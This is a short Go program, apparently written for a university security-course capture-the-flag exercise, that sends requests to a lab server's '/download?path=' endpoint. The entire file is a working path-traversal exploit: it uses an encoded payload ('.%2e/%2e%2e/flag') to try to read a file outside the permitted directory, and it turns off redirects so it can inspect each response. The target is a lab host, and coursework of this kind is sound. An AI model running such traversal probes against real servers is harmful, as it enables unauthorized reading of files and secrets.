package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {
	// Base URL of the target website
	baseURL := "http://cs177.seclab.cs.ucsb.edu:18472"

	// Create a client with custom settings
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects automatically
		},
	}

	// Try to access potential file paths
	paths := []string{

		".%2e/%2e%2e/flag", // Double dot with encoding variation
	}

	for _, path := range paths {
		// Don't use url.QueryEscape here as we want to control our own encoding
		fullURL := fmt.Sprintf("%s/download?path=%s", baseURL, path)
		resp, err := client.Get(fullURL)
		if err != nil {
			fmt.Printf("Error requesting %s: %v\n", path, err)
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if resp.StatusCode != 200 {
			fmt.Printf("Path: %s\nStatus: %d\nResponse: %s\n\n", path, resp.StatusCode, string(body))
			continue
		}

		fmt.Printf("Path: %s\nStatus: %d\n\n", path, resp.StatusCode)
	}
}
